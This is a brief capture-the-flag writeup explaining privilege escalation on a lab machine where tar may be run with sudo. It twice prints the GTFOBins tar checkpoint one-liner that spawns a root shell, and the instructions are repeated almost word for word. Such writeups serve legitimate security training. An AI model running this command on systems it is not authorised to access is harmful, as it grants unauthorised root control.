### ctf


A collection of cool ctfs and their writeups


Type sudo -l and see that we can run tar app as a root. Let's go to gtfobins and get the sudo exploit for tar. If you can't find it, here type:-

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

Once you execute above command, you'll become a root user.

# Privilege Escaltion:-

Type sudo -l and see that we can run tar app as a root.
Let's go to gtfobins and get the sudo exploit for tar.
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
